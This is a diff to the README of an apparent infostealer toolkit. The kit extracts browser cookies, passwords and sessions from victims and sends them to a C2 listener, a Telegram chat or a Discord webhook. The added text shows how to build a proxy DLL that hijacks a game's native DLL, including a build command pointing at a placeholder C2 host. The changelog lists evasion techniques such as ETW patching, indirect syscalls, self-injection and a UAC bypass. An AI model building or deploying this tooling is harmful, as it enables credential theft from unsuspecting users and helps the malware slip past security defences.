@@ -164,7 +164,7 @@ What it does:
 6. **cloudflared** -- the `--tunnel` transport, downloaded to
    `%LOCALAPPDATA%\cloudflared\cloudflared.exe`
 7. **Build + verify + tests** -- `build.py all` when `bin/` is incomplete, then `build.py
-   verify` (artifacts + patchable slots) and the 24 unit tests
+   verify` (artifacts + patchable slots) and the 46 unit tests
 
 `install.ps1` is the same flow for a shell or CI: `-Check`, `-Build`, `-NoBuild`, `-NoTunnel`.
 
@@ -298,6 +298,32 @@ In `--run` mode, the C2 URL is forced to `http://127.0.0.1:<port>/` for reliabil
 When `--c2 <url>` is passed, it overrides the auto-detected IP (needed when the victim is
 on an external network and cannot reach your LAN IP).
 
+### `build.py proxy` -- native x64 DLL proxy staging
+
+```bat
+python build.py payload
+python build.py proxy "C:\path\to\game\native.dll" --c2 "https://PUBLIC_C2/"
+```
+
+The command reads the original export table and generates a linker `.def` that preserves
+names, aliases, ordinals and ordinal-only exports. It links `ckdll.cpp` with `proxy.cpp`,
+patches the C2 slot and verifies the resulting export table. Output goes to
+`ifec/dll/<name>/` by default:
+
+- `native.dll` -- the proxy; this keeps the original file name.
+- `native_ck.dll` -- the untouched original, renamed for export forwarding.
+- `proxy_exports.def` -- the generated forwarding map, useful for inspection.
+
+The proxy's `DllMain` only starts a worker thread. Browser extraction runs outside that
+loader-lock-owning entrypoint, while calls to the original DLL continue through the forwarders.
+The build stages files only; it never replaces the installed game DLL. Back up that DLL,
+then place both staged DLLs beside the game executable. Current target support is native
+x64 PE32+; x86, .NET and malformed images are rejected. Data-export consumers and unusual
+ABI/export-name collisions need a per-target load test. Do not copy Windows system DLLs
+into an application directory; the intended target is the game's own native DLL.
+
+Use `-o <directory>` to choose another staging directory.
+
 ### `pick.py` -- manual infector GUI
 
 ```bat
@@ -314,7 +340,7 @@ classification (`bom`, `one-shot`, `risky`, `avoid`, `incompatible`, `out`).
 ### `listen.py` -- HTTP/TLS listener
 
 ```bat
-python listen.py [port] [--telegram <token:chat>] [--discord <webhook_url>] [--tls-cert <pem>] [--tls-key <pem>]
+python listen.py [port] [--bind <address>] [--telegram <token:chat>] [--discord <webhook_url>] [--tls-cert <pem>] [--tls-key <pem>]
 ```
 
 - Default port 8080 when called without arguments (auto.py starts it on the configured port)
@@ -845,7 +871,8 @@ terminates TLS at its edge and forwards plain HTTP to `127.0.0.1:<port>`, so:
   where port-forwarding is impossible;
 - the payload still runs its own schannel handshake against a publicly trusted chain, so
   the TLS path is exercised end to end, not emulated;
-- `listen.py` is untouched (plain HTTP on the loopback side); cookies, passwords, session
+- `listen.py` remains plain HTTP on the loopback side and is started with
+  `--bind 127.0.0.1`; no inbound firewall rule is requested. Cookies, passwords, session
   split, chunking and the `/health` probe all behave as they do locally.
 
 The URL is printed when the tunnel is up and is only embedded after `https://.../health`
@@ -1077,7 +1104,8 @@ Full version history in **[CHANGELOG.md](CHANGELOG.md)**.
 
 | Version | Highlights |
 |---|---|
-| **v15** (current) | `--tunnel`: C2 over a `cloudflared` quick tunnel (public https, no VPS/domain/port-forward, works behind CGNAT); installers rebuilt -- `cloudflared` step, correct exit-code handling, import-based dependency checks, post-install `build.py verify` + 24 tests, `-Check` modes that return nonzero |
+| **v16** (current) | Native x64 DLL proxy staging with export forwarding; strict shared loader patching; complete native file/network I/O; UTF-16 password conversion fix; loopback-only tunnel listeners with no firewall rule; remote HTTP endpoint handling; neutral loader metadata; 46 tests |
+| **v15** | `--tunnel`: C2 over a `cloudflared` quick tunnel (public https, no VPS/domain/port-forward, works behind CGNAT); installers rebuilt -- `cloudflared` step, correct exit-code handling, import-based dependency checks, post-install `build.py verify` + 24 tests, `-Check` modes that return nonzero |
 | **v14** | Key stage gated on a directory write probe instead of the process token: per-user Chromium installs (Vivaldi, Brave, per-user Chrome) unwrap app-bound keys at medium IL; the fodhelper/computerdefaults ms-settings bypass was implemented, tested and removed (Defender `Behavior:Win32/UACBypassExp.T!gen` kills the loader itself) |
 | v13 | Self-injection: payload mapped into loader.exe (no notepad hollowing), indirect `Nt*` syscalls from ntdll SSNs + `syscall; ret` gadget, `EtwEventWrite` patch, header wipe, `MicrosoftSignedOnly` mitigation, `.pdata` registration, base-relocation fallback; `auto.py`/`pick.py` wait for payload completion |
 | v12 | TLS 1.2 C2 in the payload (schannel, chain + hostname validation, caller-owned token buffers), record-boundary chunking with per-chunk `200` ACKs, listener `--tls-cert/--tls-key`, https-aware `auto`/`c2auth`, VPS bootstrap TLS default |
